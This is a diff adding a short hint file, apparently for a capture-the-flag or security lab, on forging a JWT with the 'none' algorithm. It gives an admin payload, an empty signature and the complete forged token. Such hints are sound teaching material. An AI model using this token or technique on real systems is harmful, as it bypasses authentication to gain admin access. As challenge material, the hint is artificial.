@@ -1,0 +1,9 @@
+💡 Hint: Creating a None Algorithm JWT
+
+Create a forged JWT with:
+- Header: {"alg":"none","typ":"JWT"}
+- Payload: {"username":"admin","role":"admin","user_id":"admin"}
+- Signature: empty (just a trailing dot)
+
+Base64 encode header and payload, join with dots, add empty signature:
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwidXNlcl9pZCI6ImFkbWluIn0.
